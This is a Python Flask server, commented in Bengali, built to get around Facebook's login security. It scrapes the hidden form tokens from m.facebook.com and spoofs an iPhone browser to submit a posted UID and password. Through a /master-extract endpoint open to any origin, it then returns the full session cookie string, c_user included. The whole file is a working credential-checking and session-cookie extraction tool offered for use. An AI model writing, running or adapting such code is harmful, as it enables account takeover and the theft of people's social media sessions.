import os
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# এই ফাংশনটি ফেসবুকের সিকিউরিটি গেটকে ফাঁকি দিবে
def bypass_fb_logic(uid, password):
    session = requests.Session()
    # মাস্টার হেডার (এটি ফেসবুককে মনে করাবে এটি একটি রিয়েল ডিভাইস)
    headers = {
        'authority': 'm.facebook.com',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    }

    try:
        # ১. ফেসবুকের মেইন পেজে গিয়ে সেশন তৈরি করা
        response = session.get('https://m.facebook.com/login.php', headers=headers)
        
        # ২. ডাইনামিক সিকিউরিটি টোকেনগুলো সংগ্রহ করা (lsd, jazoest, etc.)
        payload = {
            'lsd': re.search('name="lsd" value="(.*?)"', response.text).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', response.text).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"', response.text).group(1),
            'li': re.search('name="li" value="(.*?)"', response.text).group(1),
            'email': uid,
            'pass': password,
            'login': 'Log In'
        }

        # ৩. আসল লগইন রিকোয়েস্ট (একদম মানুষের মতো আচরণ করবে)
        post_headers = headers.copy()
        post_headers['content-type'] = 'application/x-www-form-urlencoded'
        post_headers['referer'] = 'https://m.facebook.com/login.php'

        # সেশনটি মেইনটেইন করে সাবমিট করা
        login_res = session.post('https://m.facebook.com/login.php', data=payload, headers=post_headers, allow_redirects=True)

        cookies = session.cookies.get_dict()

        if 'c_user' in cookies:
            # ১০০% সাকসেস: সব কুকি একসাথে করা
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            return {"status": "success", "cookie": cookie_str}
        
        elif 'checkpoint' in cookies:
            return {"status": "checkpoint", "message": "Approval Needed!"}
        
        else:
            return {"status": "failed", "message": "Wrong UID/Password"}

    except Exception as e:
        return {"status": "error", "message": "Server Busy"}

@app.route('/master-extract', methods=['POST'])
def master_extract():
    data = request.json
    uid = data.get('uid')
    password = data.get('password')
    result = bypass_fb_logic(uid, password)
    return jsonify(result)

if __name__ == '__main__':
    app.run()
